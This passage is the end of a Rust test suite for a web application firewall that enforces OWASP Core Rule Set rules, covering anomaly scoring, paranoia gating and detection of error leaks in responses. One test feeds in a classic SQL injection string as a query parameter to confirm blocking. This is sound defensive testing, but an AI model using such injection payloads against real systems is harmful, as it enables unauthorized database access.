    #[test]
    fn disabling_scoring_restores_first_match_wins() {
        let cfg = OwaspConfig {
            anomaly_scoring: false,
            ..OwaspConfig::default()
        };
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["notice"])).with_config(&cfg);
        let hit = checker
            .check(&scoring_ctx("x=p0"))
            .expect("first match wins when scoring is off");
        assert_eq!(hit.rule_id.as_deref(), Some("TEST-0"));
        assert!(hit.detail.contains("triggered"), "{}", hit.detail);
    }

    /// The paranoia gate applies to the *score*, not only to the match: an
    /// out-of-scope rule contributes nothing, so it cannot push an in-scope
    /// rule over the threshold.
    #[test]
    fn an_out_of_scope_rule_contributes_nothing() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-PL1\n    name: pl1\n    category: test\n    \
                    severity: warning\n    paranoia: 1\n    field: query\n    operator: contains\n    \
                    value: \"p0\"\n    action: block\n  - id: TEST-PL2\n    name: pl2\n    \
                    category: test\n    severity: warning\n    paranoia: 2\n    field: query\n    \
                    operator: contains\n    value: \"p1\"\n    action: block\n";
        let checker = OWASPCheck::from_yaml(yaml);

        let at_paranoia = |level: u8| {
            let mut ctx = scoring_ctx("x=p0&y=p1");
            ctx.host_config = Arc::new(HostConfig {
                code: "test".into(),
                host: "example.com".into(),
                defense_config: DefenseConfig {
                    owasp_set: true,
                    owasp_paranoia: level,
                    ..DefenseConfig::default()
                },
                ..HostConfig::default()
            });
            ctx
        };

        assert!(
            checker.check(&at_paranoia(1)).is_none(),
            "at PL1 only the PL1 rule scores: 3 < 5"
        );
        assert!(
            checker.check(&at_paranoia(2)).is_some(),
            "at PL2 both score: 3 + 3 >= 5"
        );
    }

    /// An unreadable severity is scored `critical` (fail-closed) and the rule
    /// id is recorded, so a typo shows up as a diagnostic rather than as a
    /// quietly weakened rule.
    #[test]
    fn an_unknown_severity_is_scored_critical_and_recorded() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["definitely-not-a-severity"]));
        assert_eq!(checker.load_summary().severity_defaulted, vec!["TEST-0".to_owned()]);
        assert!(
            checker.check(&scoring_ctx("x=p0")).is_some(),
            "the fail-closed default must still block alone"
        );
    }

    /// The `detail` an operator reads has to account for the whole score, and
    /// say so explicitly when it stops naming rules.
    #[test]
    fn the_detail_accounts_for_every_contributing_rule() {
        let many = vec!["notice"; MAX_NAMED_CONTRIBUTORS + 3];
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&many));
        let query = (0..many.len())
            .map(|i| format!("a{i}=p{i}"))
            .collect::<Vec<_>>()
            .join("&");
        let hit = checker.check(&scoring_ctx(&query)).expect("15 notices must block");

        let expected_score = 2 * many.len();
        assert!(
            hit.detail.contains(&format!("score {expected_score} reached")),
            "the score must be the full sum, not the truncated list: {}",
            hit.detail
        );
        assert!(
            hit.detail.contains(&format!("{} rule(s) contributed", many.len())),
            "{}",
            hit.detail
        );
        assert!(
            hit.detail.contains("and 3 more"),
            "elision must be explicit: {}",
            hit.detail
        );
    }

    /// The startup broadcast has to answer "what does it take to get blocked"
    /// and "which of my rules can do it alone" without opening the rule set.
    #[test]
    fn the_startup_broadcast_states_the_model_and_the_rules_that_block_alone() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["critical", "warning", "warning"]));
        let lines = checker.scoring_broadcast().join("\n");
        assert!(lines.contains("threshold"), "{lines}");
        assert!(lines.contains("critical=+5"), "{lines}");
        assert!(lines.contains("1 reach the threshold alone"), "{lines}");
        assert!(lines.contains("2 now need corroboration"), "{lines}");

        let off = OwaspConfig {
            anomaly_scoring: false,
            ..OwaspConfig::default()
        };
        let disabled = OWASPCheck::from_yaml(&scored_rules_yaml(&["warning"])).with_config(&off);
        assert!(
            disabled.scoring_broadcast().join("\n").contains("DISABLED"),
            "an operator must be told when the stricter mode is on"
        );
    }

    /// The shipped rule set, stated as the numbers the scoring model turns on.
    /// This is the inventory the change is judged against: it is *not* mostly
    /// low-severity rules, so scoring is not mostly a relaxation.
    #[test]
    fn the_shipped_rule_set_is_almost_entirely_critical() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let mut counts: BTreeMap<&str, usize> = BTreeMap::new();
        for rule in &checker.rules {
            *counts.entry(rule.severity.label()).or_default() += 1;
        }
        let critical = counts.get("critical").copied().unwrap_or_default();
        let warning = counts.get("warning").copied().unwrap_or_default();
        let notice = counts.get("notice").copied().unwrap_or_default();

        assert_eq!(
            critical + warning + notice,
            checker.request_rule_count(),
            "the enforced request set is only critical, warning and notice rules: {counts:?}"
        );
        // 220 critical / 11 warning / 1 notice. The scoring model changes the
        // verdict of a lone match for the 12 low-severity rules only — 95% of
        // the enforced set still blocks on a single hit — so this is a
        // false-positive control, not a relaxation of detection. Pinned so a
        // rule-file change that shifts the balance has to be argued for in the
        // diff. 207 critical before the `multipart/form-data` parser: all nine
        // rules it turned on are `severity: CRITICAL` upstream, which is why
        // the ratio barely moves. 216 / 10 / 0 before `header:<name>`: of the
        // six 920 rules it turned on, four are CRITICAL (920275, 920520,
        // 920521, 920600), one WARNING (920210) and one is the first NOTICE in
        // the set (920310, an empty Accept header — upstream scores it 2, below
        // the inbound threshold, so it cannot block on its own by design).
        assert_eq!(warning, 11, "the rules that stop blocking alone: {counts:?}");
        assert_eq!(notice, 1, "CRS-920310, the only notice-severity rule: {counts:?}");
        assert_eq!(critical, 220, "the rules that still block alone: {counts:?}");

        // The response set has its own shape and its own threshold, so it is
        // counted separately. 43 critical + 16 error, all of which reach the
        // outbound threshold of 4 on their own — which is upstream's posture
        // for RESPONSE-95x, not a local escalation.
        let mut response_counts: BTreeMap<&str, usize> = BTreeMap::new();
        for rule in &checker.response_rules {
            *response_counts.entry(rule.severity.label()).or_default() += 1;
        }
        assert_eq!(
            response_counts.get("critical").copied().unwrap_or_default(),
            43,
            "{response_counts:?}"
        );
        assert_eq!(
            response_counts.get("error").copied().unwrap_or_default(),
            16,
            "{response_counts:?}"
        );
        assert_eq!(response_counts.values().sum::<usize>(), checker.response_rule_count());
        assert!(
            checker.load_summary().severity_defaulted.is_empty(),
            "every shipped rule must declare a severity this engine understands: {:?}",
            checker.load_summary().severity_defaulted
        );
        assert!(
            checker.load_summary().action_defaulted.is_empty(),
            "every shipped rule must declare an action this engine understands: {:?}",
            checker.load_summary().action_defaulted
        );
    }

    /// The converter has written `crs_id:` into every generated file since it
    /// was written, and until this field existed serde discarded all of it —
    /// leaving the engine unable to name a rule the way every other CRS tool
    /// names it.
    #[test]
    fn every_shipped_rule_carries_its_upstream_crs_id() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        assert!(checker.rule_count() > 0, "no rules loaded from {}", crs_dir().display());
        let missing: Vec<&str> = checker
            .rules
            .iter()
            .filter(|r| r.crs_id.is_none())
            .map(|r| r.id.as_str())
            .collect();
        assert!(missing.is_empty(), "rules without an upstream CRS id: {missing:?}");
        let libinjection = checker
            .rules
            .iter()
            .find(|r| r.id == "CRS-942100")
            .expect("CRS-942100 is in the shipped rule set");
        assert_eq!(libinjection.crs_id, Some(942_100));
    }

    /// A rule file that predates the `crs_id:` key must still yield the numeric
    /// id, because the prefixed `id:` has always carried it.
    #[test]
    fn a_missing_crs_id_is_recovered_from_the_prefixed_id() {
        let checker = OWASPCheck::from_yaml(
            r"
version: '1.0'
rules:
  - id: CRS-931100
    name: Legacy rule without crs_id
    severity: critical
    paranoia: 1
    field: query
    operator: contains
    value: 'legacy'
    action: block
  - id: LOCAL-1
    name: Rule with no upstream counterpart
    severity: critical
    paranoia: 1
    field: query
    operator: contains
    value: 'local'
    action: block
",
        );
        assert_eq!(checker.rules.len(), 2);
        let by_id = |id: &str| {
            checker
                .rules
                .iter()
                .find(|r| r.id == id)
                .map(|r| r.crs_id)
                .expect("rule present in the inline rule set")
        };
        assert_eq!(by_id("CRS-931100"), Some(931_100));
        assert_eq!(by_id("LOCAL-1"), None);
    }

    // ── Response phase ────────────────────────────────────────────────────────

    /// A response context around `body`/`status`, with the request that
    /// provoked it carrying nothing a request-phase rule could match.
    fn response_ctx(status: u16, body: &str, paranoia: u8) -> ResponseCtx {
        let mut request = make_ctx("GET", "/report", 0);
        request.host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: DefenseConfig {
                owasp_set: true,
                owasp_paranoia: paranoia,
                ..DefenseConfig::default()
            },
            ..HostConfig::default()
        });
        ResponseCtx {
            request,
            status,
            headers: HashMap::from([("content-type".to_owned(), "text/html".to_owned())]),
            body_preview: Bytes::copy_from_slice(body.as_bytes()),
            body_truncated: false,
        }
    }

    fn crs_checker() -> OWASPCheck {
        OWASPCheck::from_directory(&crs_dir()).with_config(&OwaspConfig::default())
    }

    /// The wiring, end to end: an Oracle error in the body is a CRS-951120 hit,
    /// the outbound score reaches the outbound threshold, and the verdict names
    /// 959100 rather than the request-phase 949110.
    #[test]
    fn a_sql_error_in_the_response_body_is_caught_by_the_response_pipeline() {
        let checker = crs_checker();
        let ctx = response_ctx(200, "<html>ORA-00933: SQL command not properly ended</html>", 1);
        let hit = ResponseCheck::check(&checker, &ctx).expect("CRS-951120 must fire on an Oracle error");
        assert!(hit.detail.contains("CRS-959100"), "{}", hit.detail);
        assert!(hit.detail.contains("CRS-951120"), "{}", hit.detail);
        assert_eq!(hit.phase, Phase::Owasp);
    }

    /// The same body through the *request* pipeline must do nothing: a response
    /// rule that leaked into the request phase would fire on every bug report
    /// pasted into a form.
    #[test]
    fn a_response_rule_cannot_fire_on_a_request() {
        let checker = crs_checker();
        assert!(
            checker
                .check(&make_ctx_with_body("note=ORA-00933: SQL command not properly ended", 4))
                .is_none(),
            "an Oracle error in a REQUEST body is not a leak"
        );
    }

    /// A clean response scores nothing, and — the part that matters for a proxy
    /// — costs no verdict.
    #[test]
    fn an_ordinary_response_body_is_not_a_finding() {
        let checker = crs_checker();
        for body in [
            "<html><body><h1>Welcome</h1><p>All systems normal.</p></body></html>",
            "{\"status\":\"ok\",\"items\":[1,2,3]}",
            "<html>Index of the documentation is on the wiki</html>",
        ] {
            assert!(
                ResponseCheck::check(&checker, &response_ctx(200, body, 4)).is_none(),
                "false positive on an ordinary response: {body}"
            );
        }
    }

    /// `950100` (`RESPONSE_STATUS ^5\d{2}$`) is a paranoia-2 rule, so a 500 is
    /// clean at PL1 and a finding at PL2. This is also the only rule that reads
    /// the status, so it is what proves `Field::ResponseStatus` is wired.
    #[test]
    fn the_status_code_is_a_response_surface_gated_by_paranoia() {
        let checker = crs_checker();
        assert!(
            ResponseCheck::check(&checker, &response_ctx(500, "<html>oops</html>", 1)).is_none(),
            "950100 is paranoia 2; a 500 must be clean at PL1"
        );
        let hit = ResponseCheck::check(&checker, &response_ctx(500, "<html>oops</html>", 2))
            .expect("950100 must fire on a 5xx at PL2");
        assert!(hit.detail.contains("CRS-950100"), "{}", hit.detail);
        assert!(
            ResponseCheck::check(&checker, &response_ctx(200, "<html>oops</html>", 2)).is_none(),
            "a 200 is not a 5xx"
        );
    }

    /// The threshold difference, stated as a test because it is the single
    /// easiest thing to get wrong: the outbound comparison is against 4, and one
    /// `error` rule (weight 4) therefore acts alone where the same rule would
    /// not reach the inbound 5.
    #[test]
    fn one_error_response_rule_reaches_the_outbound_threshold_alone() {
        let cfg = OwaspConfig::default();
        assert_eq!(cfg.outbound_anomaly_score_threshold, 4, "upstream tx default");
        assert_eq!(cfg.inbound_anomaly_score_threshold, 5, "and it is NOT the inbound one");
        assert!(cfg.error_anomaly_score >= cfg.outbound_anomaly_score_threshold);
        assert!(cfg.error_anomaly_score < cfg.inbound_anomaly_score_threshold);

        // CRS-952110 (Java errors) is `severity: error`, i.e. exactly 4.
        let checker = crs_checker();
        let hit = ResponseCheck::check(
            &checker,
            &response_ctx(200, "<pre>java.lang.NullPointerException</pre>", 1),
        )
        .expect("a lone ERROR response rule must reach the outbound threshold");
        assert!(hit.detail.contains("score 4 reached the threshold 4"), "{}", hit.detail);
    }

    /// Raising the outbound threshold must actually raise it — the dial is wired
    /// to the response verdict and to nothing else.
    #[test]
    fn the_outbound_threshold_is_configurable_and_independent() {
        let strict_inbound = OwaspConfig {
            inbound_anomaly_score_threshold: 1,
            outbound_anomaly_score_threshold: 99,
            ..OwaspConfig::default()
        };
        let checker = OWASPCheck::from_directory(&crs_dir()).with_config(&strict_inbound);
        assert!(
            ResponseCheck::check(
                &checker,
                &response_ctx(200, "<pre>java.lang.NullPointerException</pre>", 1)
            )
            .is_none(),
            "an unreachable outbound threshold must suppress the response verdict"
        );
        // …while the inbound one, set to 1, still blocks the request phase.
        assert!(
            checker.check(&make_ctx_with_query("id=1' or '1'='1")).is_some(),
            "the inbound threshold must be unaffected by the outbound one"
        );
    }

    /// Two response rules on one body sum into one verdict rather than each
    /// producing its own — the accumulator, not first-match-wins.
    #[test]
    fn response_contributions_accumulate_into_one_verdict() {
        let checker = crs_checker();
        let ctx = response_ctx(
            200,
            "<html>ORA-00933: SQL command not properly ended<br>java.lang.NullPointerException</html>",
            1,
        );
        let hit = ResponseCheck::check(&checker, &ctx).expect("both rules fire");
        // 951120 critical (5) + 952110 error (4).
        assert!(hit.detail.contains("score 9 reached the threshold 4"), "{}", hit.detail);
        assert!(hit.detail.contains("2 rule(s) contributed"), "{}", hit.detail);
    }

    /// A host with CRS switched off must not be inspected, in either phase.
    #[test]
    fn a_host_with_owasp_off_is_not_inspected_in_the_response_phase() {
        let checker = crs_checker();
        let mut ctx = response_ctx(200, "<html>ORA-00933: SQL command not properly ended</html>", 4);
        ctx.request.host_config = Arc::new(HostConfig {
            defense_config: DefenseConfig {
                owasp_set: false,
                ..DefenseConfig::default()
            },
            ..HostConfig::default()
        });
        assert!(ResponseCheck::check(&checker, &ctx).is_none());
    }

    /// The startup broadcast has to name the outbound threshold: an operator who
    /// reads only "threshold 5" and assumes it governs responses has been misled.
    #[test]
    fn the_broadcast_states_both_thresholds() {
        let lines = crs_checker().scoring_broadcast().join("\n");
        assert!(lines.contains("inbound score reaches 5"), "{lines}");
        assert!(lines.contains("OUTBOUND score reaches 4"), "{lines}");
        assert!(lines.contains("959100"), "{lines}");
        assert!(lines.contains("59 enforced"), "{lines}");
    }

    /// With no response rule loaded the check must decline before it looks at
    /// anything, because that is what keeps the gateway's response path off.
    #[test]
    fn a_rule_set_without_response_rules_registers_nothing() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "contains", "evil"));
        assert_eq!(checker.response_rule_count(), 0);
        assert!(ResponseCheck::check(&checker, &response_ctx(500, "ORA-00933:", 4)).is_none());
    }

    /// CRS-954130 is the rule the `!@op` gap cost most visibly: a `phase:4`
    /// rule both of whose conditions this engine can read, which used to be
    /// emitted as `operator: regex, value: '!@rx ^404$'` — a pattern matching
    /// the literal text `!@rx ^404$`, so it could never fire — and was then
    /// dropped outright.
    ///
    /// Its negation carries the meaning: an ASP.NET stack trace on a 404 is the
    /// framework's own "not found" page and says nothing about the
    /// application, while the same text on any other status is the leak.
    #[test]
    fn the_negated_response_status_rule_distinguishes_404_from_a_leak() {
        let checker = crs_checker();
        let asp_error = "<h1>Server Error in '/shop' Application.</h1><pre>at Shop.Db.Open()</pre>";

        let leak = ResponseCheck::check(&checker, &response_ctx(500, asp_error, 1))
            .expect("an ASP.NET stack trace on a 500 is a leak");
        assert!(leak.detail.contains("954130"), "{}", leak.detail);

        assert!(
            ResponseCheck::check(&checker, &response_ctx(404, asp_error, 1)).is_none(),
            "the same text on a 404 is the framework's own not-found page"
        );
        assert!(
            ResponseCheck::check(&checker, &response_ctx(500, "<h1>Something went wrong</h1>", 1)).is_none(),
            "an ordinary error page is not a leak"
        );
    }

    /// A truncated body is reported as such: "no leak found" in a prefix is a
    /// weaker statement than "no leak", and the verdict text has to say so.
    #[test]
    fn a_truncated_body_says_so_in_the_verdict() {
        let checker = crs_checker();
        let mut ctx = response_ctx(200, "<html>ORA-00933: SQL command not properly ended</html>", 1);
        ctx.body_truncated = true;
        let hit = ResponseCheck::check(&checker, &ctx).expect("the finding is inside the inspected prefix");
        assert!(hit.detail.contains("body truncated"), "{}", hit.detail);
    }
}
